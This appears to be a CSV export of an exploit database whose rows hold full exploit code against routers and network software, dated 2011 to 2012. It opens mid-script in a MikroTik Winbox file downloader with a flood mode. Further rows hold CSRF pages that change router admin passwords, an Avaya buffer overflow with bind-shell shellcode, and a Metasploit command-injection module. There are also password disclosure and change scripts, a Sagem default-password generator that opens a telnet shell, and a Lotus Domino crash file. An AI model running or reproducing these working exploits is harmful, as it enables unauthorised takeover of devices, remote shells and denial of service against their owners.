s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((mikrotikIP, 8291))
s.send(winboxStartingIndex)
data = s.recv(1024)# receiving dll index from server
time.sleep(0.001*speed)
if data.find(""\xFF\x02""+""index""+""\x00"") > -1:
print ""[+] Index received!""
else:
print ""[+] Wrong index.. Exiting..""
sys.exit(0)
return s
def download(filename, speed, s):
f = open(filename, 'wb')
if len(filename) < 13 and len(filename) > 6:
print ""[+] Requesting file "", filename, ' <->'
winboxStartingFileReq = RequestHeader + filename.ljust(12, '\x00') + RequestFirstFooter
s.send(winboxStartingFileReq)
time.sleep(0.001*speed)
dataReceived = s.recv(1)
if dataReceived[0:1]=='\xFF':
print ""[+] Receiving the file...""
f.write(dataReceived)# written 1st byte
time.sleep(0.001*speed)
dataReceived = s.recv(0x101)# 0x100 + 1
nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
if dataReceived[0:1]=='\x02':
time.sleep(0.001*speed)
f.write(dataReceived)# written 1st chunk 0x102 bytes with header in file.
dataReceived = s.recv(0x102)# 1st sequence of (0xFF 0xFF)
bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16) + 2
f.write(dataReceived)# write the next 0x102 bytes (total 0x102+0x102 in file)
else:
print ""[-] Wrong data received..(2)""
sys.exit(0)
else:
print ""[-] Wrong data received..(1)""
sys.exit(0)
finalPart=0
bigFileCounter = 0xFFED
packetsCounted=0# counter for the 0x101 packet counts. Every time a file is requested this counter is 0
fileRequested=0# every time a file needs to be requested more than 1 time, this is it's counter.
while 1:# header of file done.. Now LOOP the body..
packetsCounted+=1# dbg
time.sleep(0.001*speed)
dataReceived = s.recv(bytesToRead)
f.write(dataReceived)
if (bytesToRead <> len(dataReceived)) and packetsCounted==255:# an den diavazei osa bytesToRead prepei, simainei oti eftase sto telos i lipsi tou part pou katevazoume
packetsCounted = -1
print '[+] Next file part : ', fileRequested
s.send(RequestHeader + filename.ljust(12, '\x00') + '\xFF\xED\x00' + struct.pack('=b',fileRequested) +struct.pack('>h',bigFileCounter))
time.sleep(0.001*speed)
dataReceived = s.recv(0x101 + 2)# Reads the new header of the new part!!!
nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
f.write(dataReceived)
bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16)
fileRequested += 1
bigFileCounter -= 0x13
bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16)# den prostheto 2 tora giati to teleutaio den einai ff.. einai akrivos to size pou paramenei..
if bytesToRead==0xFF:# kalipto tin periptosi opou to teleutaio struct den einai ff alla exei to size pou apomenei
bytesToRead += 2
if bytesToRead != 0x101 and nextPartFingerprint < 65517:# dikaiologountai ta liga bytes otan teleiose ena apo ta parts tou file
time.sleep(0.001*speed)
dataReceived = s.recv(bytesToRead)
f.write(dataReceived)
break
if bytesToRead != 0x101 and nextPartFingerprint==65517:# ligotera bytes KAI fingerprint 65517 simainei corrupted file..
print '[-] File download terminated abnormaly.. please try again probably with a slower speed..'
sys.exit(0)
if fileRequested < 1:print '[+] File was small and was downloaded in one part\n[+] Downloaded successfully'
else:print '[+] File '+filename+' downloaded successfully'
f.close()
s.close()
def Flood(s):
filename = 'roteros.dll'
f = 'we\'r not gonna use I/O to store the data'
print ""[+] Requesting file "", filename, ' till death :)'
time.sleep(1)
winboxStartingFileReq = RequestHeader + filename.ljust(12, '\x00') + RequestFirstFooter
s.send(winboxStartingFileReq)
time.sleep(0.001)
dataReceived = s.recv(1)
if dataReceived[0:1]=='\xFF':
f = dataReceived# written 1st byte
time.sleep(0.001)
dataReceived = s.recv(0x101)# 0x100 + 1
nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
if dataReceived[0:1]=='\x02':
time.sleep(0.001)
f = dataReceived# written 1st chunk 0x102 bytes with header in file.
dataReceived = s.recv(0x102)# 1st sequence of (0xFF 0xFF)
bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16) + 2
f = dataReceived# write the next 0x102 bytes (total 0x102+0x102 in file)
else:
print ""[-] Wrong data received..(2)""
sys.exit(0)
else:
print ""[-] Wrong data received..(1)""
sys.exit(0)
finalPart=0
bigFileCounter = 0xFFED
packetsCounted=0# counter for the 0x101 packet counts. Every time a file is requested this counter is 0
fileRequested=0# every time a file needs to be requested more than 1 time, this is it's counter.
try:
while 1:
s.send(RequestHeader + filename.ljust(12, '\x00') + '\xFF\xED\x00' + struct.pack('=b',fileRequested) +struct.pack('>h',bigFileCounter))
s.recv(1)
print '- Sending evil packet.. press CTRL-C to stop -'
except:
print 'Connection reseted by server.. trying attacking again'
global RequestHeader
RequestHeader = ('\x12\x02')
global RequestFirstFooter
RequestFirstFooter = ('\xFF\xED\x00\x00\x00\x00')
global winboxStartingIndex
winboxStartingIndex=(RequestHeader + 'index' + '\x00'*7 + RequestFirstFooter)
winboxStartingFileReq=(RequestHeader + '\x00'*12 + RequestFirstFooter)
print '\n[Winbox plugin downloader]\n\n'
if len(sys.argv)==3:
if sys.argv[2]=='DoS':# if i combine both checks in 1st if, there will be error.. guess why.. ;)
print '[+] Hmmm we gonna attack it..'
time.sleep(1)
speed=1
mikrotikIP = sys.argv[1]
filename = sys.argv[2]
while 1:
time.sleep(1)
try:
s = InitConnection(mikrotikIP, speed)
Flood(s)
except:
time.sleep(1)
if len(sys.argv)<>4:
print 'Usage : '+sys.argv[0]+' <mikrotik_ip> <filename_to_download> <speed>\n\t<speed>:\t [from 0 to 9] 1=faster, 9=slower but more reliable\n'
sys.exit(0)
mikrotikIP = sys.argv[1]
filename = sys.argv[2]
speed = int(sys.argv[3])
if speed>9 or speed<1:
print 'Speed must be between 1 and 9 else there are unexpected results!'
sys.exit(0)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((mikrotikIP, 8291))
s.send(winboxStartingIndex)
data = s.recv(1024)# receiving dll index from server
s.close()
if filename.find('*') > -1:
DllList = data.split('\x0a')
print 'Mikrotik\'s version is '+DllList[1].split(' ')[3]+'\nThe following Dlls gonna be requested :'
for i in range(0, len(DllList)-1):
print DllList[i].split(' ')[2]
raw_input('> Press enter to continue <')
for extractedDlls in range(0, len(DllList)-1):
print ""[+] Requesting "", DllList[extractedDlls].split(' ')[2]
filename=DllList[extractedDlls].split(' ')[2]
s = InitConnection(mikrotikIP, speed)
download(filename, speed, s)
else:
s = InitConnection(mikrotikIP, speed)
download(filename, speed, s)"
2012-02-22,WebApps,Hardware,Ivano Binetti,D-Link DSL-2640B ADSL Router,Authentication Bypass,"# Exploit Title : D-Link DSL-2640B (ADSL Router) Authentication Bypass
# Date          : 22-02-2012
# Author        : Ivano Binetti (http://ivanobinetti.com)
# Vendor site   : http://www.d-link.com
# Version       : DSL-2640B
# Tested on     : Firmware Version: EU_4.00; Hardware Version: B2","+-------------------------[Authentication Bypass by Ivano Binetti]--------------------------------------------------------------------------+
Summary
1)Introduction
2)Vulnerability Description
3)Exploit
1)Introduction
D-Link DSL-2640B is an ADSL Router using (also) a web management interface.
2)Vulnerability Description
This router allows an attacker to bypass authentication and to login with administrator (""admin"") credentials.
In fact when the administrator is logged in and an internal attacker will connect to web management interface (default is http://192.168.1.1:80)
he will be able to see the MAC Address of logged admin. Symply changing his MAC Address the attacker can bypass authentication and login as
administrator.
3)Exploit
For example in OSX Snow Leopard you can on the fly change your MAC Address with the simple following CLI command:
ifconfig en0 ether <admin_mac_address>   (where en0 is the name of your network interface)"
2012-02-22,WebApps,Hardware,KinG Of PiraTeS,Sagem F@ST 2604 ADSL Router,Cross-Site Request Forgery,#NAME?,
2012-02-20,WebApps,Hardware,Ivano Binetti,D-Link DSL-2640B ADSL Router,Cross-Site Request Forgery,"# Exploit Title : D-Link DSL-2640B (ADSL Router) CSRF Vulnerability
# Date          : 19-02-2012
# Author        : Ivano Binetti (http://ivanobinetti.com)
# Vendor site   : http://www.d-link.com
# Version       : DSL-2640B
# Tested on     : Firmware Version: EU_4.00; Hardware Version: B2","+------------------------------------------[Change Admin Account Password by Ivano Binetti]--------------------------------------------------+
Summary
1)Introduction
2)Vulnerability Description
3)Exploit
1)Introduction
D-Link DSL-2640B is an ADSL Router using (also) a web management interface.
2)Vulnerability Description
The D-Link DSL-2640B's web interface (listening on tcp/ip port 80) is prone to CSRF vulnerabilities which allows to change router
parameters and -among other things- to change default administrator(""admin"") password.
3)Exploit
<html>
<body onload=""javascript:document.forms[0].submit()"">
<H2>CSRF Exploit to change ADMIN password</H2>
<form method=""POST"" name=""form0"" action=""http://192.168.1.1:80/redpass.cgi?sysPassword=new_password&change=1"">
</form>
</body>
</html>"
2012-01-20,Remote,Windows,Abysssec,Avaya WinPDM UniteHostRouter 3.8.2,Remote Command Execution,"# Abysssec Public Exploit
# more info www.abysssec.com
# Avaya WinPDM UniteHostRouter  <= 3.8.2 Remote Pre-Auth Command Execute
#A boundary error in the Unite Host Router service (UniteHostRouter.exe)
#when processing certain requests can be exploited to cause a stack-based buffer
#overflow via an overly long string in the ""To:"" field sent to UDP port 3217.
# win32_bind - EXITFUNC=thread LPORT=4444 Size=717 Encoder=PexAlphaNum
# http://metasploit.com","signed int __cdecl sub_403160(const char *Str, void *a2)
char *v2;
char *v3;
const void *v4;
char *v5;
unsigned int v6;
signed int result;
v2 = strpbrk(Str, ""\n\r"");
v3 = strpbrk(Str, ""/\n\r"");
if ( v3 >= v2 || (v4 = v3 + 1, v5 = strpbrk(v3 + 1, "":/? \n\r""), v5 > v2) )
result = 0;
else
v6 = v5 - v4;
memcpy(a2, v4, v6); // vulnerable memcpy
*((_BYTE *)a2 + v6) = 0;
result = 1;
return result;
signed int __cdecl sub_403160_patched(const char *Str, void *a2)
char *v2;
char *v3;
const void *v4;
char *v5;
unsigned int v6;
signed int result;
v2 = strpbrk(Str, ""\n\r"");
if ( v2
&& (v3 = strpbrk(Str, ""/\n\r"")) != 0
&& v3 < v2
&& (v4 = v3 + 1, (v5 = strpbrk(v3 + 1, "":/? \n\r"")) != 0)
&& v5 <= v2
&& (v6 = v5 - v4, (signed int)v6 <= 256) ) // patched by checking <= 256
memcpy(a2, v4, v6);
*((_BYTE *)a2 + v6) = 0;
result = 1;
else
result = 0;
return result;
from socket import socket, AF_INET, SOCK_DGRAM
data = '\x55\x54\x50\x2f\x31' # Protocol
data +=' To: 127.0.0.1'
data+= ' /'+""A""*260
data+= ""\xFB\xF8\xAB\x71"" # 71ABF8FB call esp W32_SOCK.dll
data += (""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49""
""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36""
""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34""
""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41""
""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e""
""\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58""
""\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47""
""\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58""
""\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38""
""\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a""
""\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30""
""\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57""
""\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58""
""\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30""
""\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c""
""\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44""
""\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50""
""\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f""
""\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33""
""\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f""
""\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f""
""\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50""
""\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d""
""\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45""
""\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f""
""\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38""
""\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55""
""\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d""
""\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d""
""\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38""
""\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35""
""\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37""
""\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56""
""\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56""
""\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54""
""\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54""
""\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53""
""\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51""
""\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35""
""\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35""
""\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c""
""\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f""
""\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f""
""\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e""
""\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a"")
data += '\r\n\r\n' #\n\n
port = 3217
hostname = '192.168.171.129'
udp = socket(AF_INET,SOCK_DGRAM)
udp.sendto(data, (hostname, port))
print ""Send malicius packet\n""
print ""You Should Got a shell at %s 4444"" % hostname"
2011-11-30,Remote,Hardware,Metasploit,CTEK SkyRouter 4200/4300,Command Execution (Metasploit),"# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name'           => 'CTEK SkyRouter 4200 and 4300 Command Execution',
'Description'    => %q{
This module exploits an unauthenticated remote root exploit within ctek SkyRouter 4200 and 4300.
'Author'         => [ 'savant42' ],  #with module help from kos
'License'        => MSF_LICENSE,
'References'     => [ 'URL', 'http://dev.metasploit.com/redmine/issues/5610'],
'Privileged'     => false,
'Payload'        =>
'DisableNops' => true,
'Space'       => 1024,
'Compat'      =>
'PayloadType' => 'cmd',
'RequiredCmd' => 'generic perl telnet netcat-e bash',
'Platform'       => 'unix',
'Arch'           => ARCH_CMD,
'Targets'        => [[ 'Automatic', { }]],
'DisclosureDate' => 'Sep 8 2011', # CGI historical date :)
'DefaultTarget' => 0))
end
def exploit
post_data = ""MYLINK=%2Fapps%2Fa3%2Fcfg_ethping.cgi&CMD=u&PINGADDRESS=;"" + Rex::Text.uri_encode(payload.encoded) + ""+%26""
uri    = '/apps/a3/cfg_ethping.cgi'
print_status(""Sending HTTP request for #{uri}"")
res = send_request_cgi( {
'global' => true,
'uri'    => uri,
'method' => ""POST"",
'data' => post_data
}, 30)
if res
print_status(""The server responded with HTTP CODE #{res.code}"")
else
print_status(""The server did not respond to our request"")
end
handler
end
end"
2011-11-09,WebApps,Hardware,Todor Donev,COMTREND CT-5624 Router,Root/Support Password Disclosure/Change,"#!/usr/bin/perl
#  [+] Comtrend Router CT-5624 Remote Root/Support Password Disclosure/Change Exploit
#  Author: Todor Donev
#  Email: todor.donev@@gmail
#  Type: Hardware
#  Vuln Type: Remote
#  Tested:
#  Board ID    : CT-5624
#  Software    : A011-306TSR-C01_R03
#  Bootloader  : 1.0.37-0.7-3
#  ADSL        : A2pB022c3.d20e
#  Board ID    : CT-5637
#  Software    : A111-312BTC-C01_R12
#  Bootloader  : 1.0.37-12.1-1
#  ADSL        : A2pB023k.d20k_rc2
#  CT-5624 ADSL2+ Ethernet Router
#  The CT-5624 series ADSL2+ compact and high performance Ethernet router
#  provides four 10/100 Ethernet Interfaces, and one ADSL line interface
#  to access the Internet, incorporating LAN or Video on Demand over one
#  ordinary telephone line, at speeds of up to 24 Mbps. It also has full
#  routing capabilities to segment/route IP protocol, and supports advanced
#  security functions.
#  playground$ perl comtrend.pl -c 192.168.1.1:80
#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
#  [!] Target: 192.168.1.1:80
#  [o] New root password: root31337
#  [o] New support password: sup31337
#  [*] Successfully !!
#  playground$ perl comtrend.pl -d 192.168.1.1:80
#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
#  [!] Target: 192.168.1.1:80
#  [o] root: root31337
#  [o] support: sup31337
#  playground$ perl comtrend.pl
#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
#  [!] usg: perl comtrend.pl [-c or -d] <victim>
#  [!]  -d: Disclosure Root/Support password
#  [!]  -c: Change Root/Support password
#  Thanks to Tsvetelina Emirska
#  for the help and support which gives me =)","use LWP::Simple;
print ""[+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit\n"";
if (@ARGV == 0) {&usg;}
while (@ARGV > 0) {
$type = shift(@ARGV);
$t = shift(@ARGV);
if ($type eq ""-d"") {
my $r = get(""http://$t/password.cgi"") or die(""suck!"");
print ""[!] Target: $t\n"";
if ($r =~ m/pwdAdmin = '(.*)';/g) {
$result .= ""[o] root: $1\n"";
if ($r =~ m/pwdSupport = '(.*)';/g) {
$result .= ""[o] support: $1\n"";
print $result;
if ($type eq ""-c"") {
print ""[!] Target: $t\n"";
print ""[o] New root password: "";
my $rootpass=<STDIN>;
chomp($rootpass);
print ""[o] New support password: "";
my $suppass=<STDIN>;
chomp($suppass);
my $r = get(""http://$t/password.cgi?sysPassword=$rootpass&sptPassword=$suppass"") or die(""suck!"");
if ($r =~ m/pwdAdmin = '$rootpass';/g) {
print ""[*] Successfully !!\n"";
sub usg(){
print ""[!] usg: perl comtrend.pl [-c or -d] <victim>\n"";
print ""[!]  -d: Disclosure Root/Support password\n"";
print ""[!]  -c: Change Root/Support password\n"";
exit;"
2011-08-16,Remote,Hardware,Elouafiq Ali,Sagem Router Fast 3304/3464/3504,Telnet Authentication Bypass,"#!/home/bin/python
# Remote Exploit: SAGEM ROUTER FAST 3304/3464/3504 - Telnet Authentication bypass
# Date: 15-August-2011
# Author: Elouafiq Ali
# Version: 3304-V1 / 3304-V2 / 3464 / 3504
# Tested on: Linux Ubuntu 11.04, Linux Backtrack 5
# Tested Router: SAGEM FAST 3304-V2
# Tested on Resellers/ISPs: Wanadoo (France), Maroc Telecom (Morocco)
# Products affected: Sagem Fast 3304-V1 / 3304-V2 / 3464 / 3504
# Blog: http://keelhaule.tumblr.com
#Usually Telnet prompt starts with this, if the telnet service provide another
#prompt, change it to that prompt
#the note above also applies for this
#just omit this line if you want to just have the telnet command prompt,
#or change it to what feel confortable with
#some arbitrary value
# Input Sanitization and Normalization
# Exploit written by Ali Elouafiq , Exploit-DB , 2011","Sagem Fast Routers (3304-V1 / 3304-V2 / 3464 / 3504) Come with a default Preconfigured Root Password
That the ISPs don't change it, but instead they create another admin account above it,
the root password differs from a router to another, since it is computed from its MAC address.
Thus, each unique router has its own password what makes bruteforce or dictionary attacks inefficient or impossible
After reverse engineering the Algorithm that computes the default password based on the MAC address
This exploit opens a remote shell in the remote host.
(Generally its an Almquist Shell 'ash', which commands are compatible to the Bourne Shell 'bsh')
Usage: ./{file_name} ip_adress mac_address
from telnetlib import Telnet
import time, sys, tty, termios
from threading import *
host = ''
port = 23
user = ""root""
password=""""
class ReaderThread(Thread):
def __init__(self, telnet):
self.telnet = telnet
Thread.__init__(self)
def run(self):
while 1:
str = self.telnet.read_some()
if str == '': break
sys.stdout.write(str)
sys.stdout.flush()
def mash(a,b):
first=min(a,b)
second=max(a,b)
if( int(second ,16 ) < 10) :
if(int(first,16)+int(second,16)<=9):
return chr(ord(first)+int(second,16))
else:
return hex(ord(first)+int(second,16))
else:
return chr(ord(second)+int(first,16))
def main(host, port):
telnet = Telnet()
telnet.open(host, port)
telnet.read_until(""login: "")
telnet.write(user + ""\n"")
telnet.read_until(""Password: "")
telnet.write(password + ""\n"")
telnet.write(""shell\n"")
reader = ReaderThread(telnet)
reader.start()
fd = sys.stdin.fileno()
old_settings = termios.tcgetattr(fd)
tty.setraw(fd)
while 1:
if not reader.isAlive(): break
ch = sys.stdin.read(1)
telnet.write(ch)
telnet.close()
termios.tcsetattr(fd, 1, old_settings)
if __name__ == '__main__':
try:
host = sys.argv[1]
except: pass
mac_address=sys.argv[2]
lenght=len(mac_address)
password=[ c for c in ""00000000"" ]
if lenght!=12 :
if lenght==17:
if mac_address[2]==':' :
mac_address = """".join([i.zfill(2) for i in mac_address.split("":"")]).lower()
elif mac_address[2]=='-' :
mac_address = """".join([i.zfill(2) for i in mac_address.split("":"")]).lower()
else:
print  '[!] Please enter a valid MAC address!'
exit()
else:
print  ""[!] Please enter a valid MAC address!""
exit()
mac=[ c.lower() for c in mac_address]
password[0]= mash(mac[5],mac[11])
password[1]= mash(mac[0],mac[2])
password[2]= mash(mac[10],mac[11])
password[3]= mash(mac[0],mac[9])
password[4]= mash(mac[10],mac[6])
password[5]= mash(mac[3],mac[9])
password[6]= mash(mac[1],mac[6])
password[7]= mash(mac[3],mac[4])
password="""".join(p for p in password)
print ""[+] W00t The Passwd is "", password
main(host, port)"
2011-07-19,DoS,Multiple,anonymous,Lotus Domino SMTP Router & Email Server and Client,Denial of Service,"# Exploit Title: Lotus Domino SMTP router, EMAIL server and client DoS - all 3 may crash
# Date: July 16, 2011
# Author: None - looks like a malformed Kerio generated calendar invitation was the reason this was discovered -http://forums.kerio.com/index.php?t=msg&th=19863&start=0
# Software Link: none - cut/paste the malformed meeting invitation show below, send into some Domino shop as a mime type text/calendar with a filename.ics
# Version: 8.5.3 and very likely all 7.x and 8.x
# Tested on: W2K3, W2K8, XP running 8.5.3
# CVE : none - but IBM has patches for this and other
https://www-304.ibm.com/support/docview.wss?q1=vulnerability%20OR%20vulnerabilities&rs=0&uid=swg21461514&cs=utf-8〈=en&loc=en_US&cc=us
https://www-304.ibm.com/support/docview.wss?uid=swg21504183
DESCRIPTION:Meeting invite - Today 18th 9-10am
SUMMARY:Once again","items
....................... cut/paste this to create a meeting.ics or hello.ics file as an
attachment..................................
BEGIN:VCALENDAR
PRODID:-//Bank-of-America.com/
METHOD:REPLY
VERSION:2.0
X-VERSION-MSX:7.2
BEGIN:VTIMEZONE
TZID:GMT
BEGIN:STANDARD
DTSTART:19501029T020000
TZOFFSETFROM:+0100
TZOFFSETTO:+0000
RRULE:FREQ=YEARLY;BYMONTH=10;BYDAY=-1SU;BYHOUR=2;BYMINUTE=0
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:19500326T020000
TZOFFSETFROM:+0000
TZOFFSETTO:+0100
RRULE:FREQ=YEARLY;BYMONTH=3;BYDAY=-1SU;BYHOUR=2;BYMINUTE=0
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTEND:20110621T100000Z
TRANSP:OPAQUE
ORGANIZER;CN=""PKim/BOA.com/"":mailto:rjones_at_applegate.com
UID:CBFF44ACA1Ff5A99802578B2004AD7A0-Lotus_Notes_Generated
DTSTAMP:20110617T104325Z
SEQUENCE:0
DTSTART:20110621T090000Z
CREATED:20110617T104400Z
X-MICROSOFT-CDO-BUSYSTATUS:BUSY
CLASS:PUBLIC
ATTENDEE;PARTSTAT=ACCEPTED;CN=RTBeinn_at_aclu.org;CUTYPE=INDIVIDUAL:mailto:meandyou_at_gmail.com
REQUEST-STATUS:2.0
END:VEVENT
END:VCALENDAR"
2011-05-30,WebApps,Hardware,Aodrulez,Belkin F5D7234-4 v5 G Wireless Router,Remote Hash Exposed,#/usr/bin/perl,"| Belkin G Wireless Router Admin Exploit. |
Firmware Version : 5.00.12 (Sep 10 2009 19:54:12)
Boot Version     : 1.18
Hardware         : F5D7234-4 v5 (01)
Author           : Aodrulez.
Email            : f3arm3d3ar@gmail.com
Twitter          : http://twitter.com/Aodrulez
| Details |
The router's web interface reveals the Administrator Password's
MD5 Hash. Its even possbile to bypass the login completely.
| Exploit |
use LWP::Simple;
print ""\n Aodrulez's 'Belkin G Wireless Router' Admin Exploit\n"";
print ""\n ---------------------------------------------------\n\n"";
print ""[+] Enter the Router's IP Address : "";
my $password=<STDIN>;
chomp($password);
$password=get(""http://"".$password.""/login.stm"") or die ""\n[!] Wrong IP Address?\n"";
my @aod=$password =~ m/var password = ""(.*)"";/g;
print ""[+] Admin Password = "".@aod[0]."" (MD5 Hash).\n\n"";
| Greetz Fly Out To |
1] Amforked()          : My Mentor.
2] The Blue Genius     : My Boss.
3] str0ke (milw0rm)
4] www.orchidseven.com
5] www.malcon.org
6] www.isac.org.in
| Quote |
""Music is my Religion & Jimmy Page, my GOD."" - Aodrulez"
2011-03-04,Remote,Hardware,Todor Donev,COMTREND ADSL Router CT-5367 C01_R12,Remote Code Execution,"/*COMTREND ADSL Router BTC(VivaCom) CT-5367 C01_R12  Remote Root
/*HTTP/1.1 401 Unauthorized
/*HTTP/1.1 200 Ok
## BINGOO !! Godlike =))
# cat /proc/version
# ps
# top
# echo *                                               ## ls o.O?!?
# </textarea>","Board ID: 96338A-122
Software: A111-312BTC-C01_R12
Bootloader: 1.0.37-12.1-1
Wireless Driver: 4.170.16.0.cpe2.1sd
ADSL: A2pB023k.d20k_rc2
Type: HardWare
Risk of use: High
Type to use: Remote
Discovered by: Todor Donev
Author Email: todor.donev@gmail.com
Special greetz to my sweetheart friend and my lil' secret Tsvetelina Emirska,
and all my other friends that support me a lot of times for everything !!
root@linux:~#  get.pl http://192.168.1.1/
Cache-Control: no-cache
Connection: close
Date: Sat, 01 Jan 2000 00:04:31 GMT
Server: micro_httpd                        ## Yeah !! Bite me :(
WWW-Authenticate: Basic realm=""DSL Router""
Content-Type: text/html
<HTML><HEAD><TITLE>401 Unauthorized</TITLE></HEAD>
<BODY BGCOLOR=""#cc9999""><H4>401 Unauthorized</H4>
Authorization required.
<HR>
<ADDRESS><A HREF=""http://www.acme.com/software/micro_httpd/"">micro_httpd</A></ADDRESS>
</BODY></HTML>
root@linux:~#  get.pl http://192.168.1.1/password.cgi   ## Information Disclosure
Cache-Control: no-cache
Connection: close
Date: Mon, 03 Jan 2000 23:01:25 GMT
Server: micro_httpd
Content-Type: text/html
<html>
<head>
<meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
<link rel=""stylesheet"" href='stylemain.css' type='text/css'>
<link rel=""stylesheet"" href='colors.css' type='text/css'>
<script language=""javascript"" src=""util.js""></script>
<script language=""javascript"">
<!-- hide\n                               ## Dammit! =))
pwdAdmin = '<CENSORED>';                  ## Censored Password
pwdSupport = '<CENSORED>';                ## Censored Password
pwdUser = '<CENSORED>';\n                 ## Censored Password
[CUT EXPLOIT HERE]                        ## CSRF For Change All passwords
<html>
<head></head>
<title>COMTREND ADSL Router BTC(VivaCom) CT-5367 C01_R12 Change All passwords</title>
<body onLoad=javascript:document.form.submit()>
<form action=""http://192.168.1.1/password.cgi""; method=""POST"" name=""form"">
<!-- Change default system Passwords to ""shpek"" without authentication and verification -->
<input type=""hidden"" name=""sptPassword"" value=""shpek"">
<input type=""hidden"" name=""usrPassword"" value=""shpek"">
<input type=""hidden"" name=""sysPassword"" value=""shpek"">
</form>
</body>
</html>
[CUT EXPLOIT HERE]
root@linux:~# telnet 192.168.1.1
ADSL Router Model CT-5367 Sw.Ver. C01_R12
Login: root
Password:
> ?
help
logout
reboot
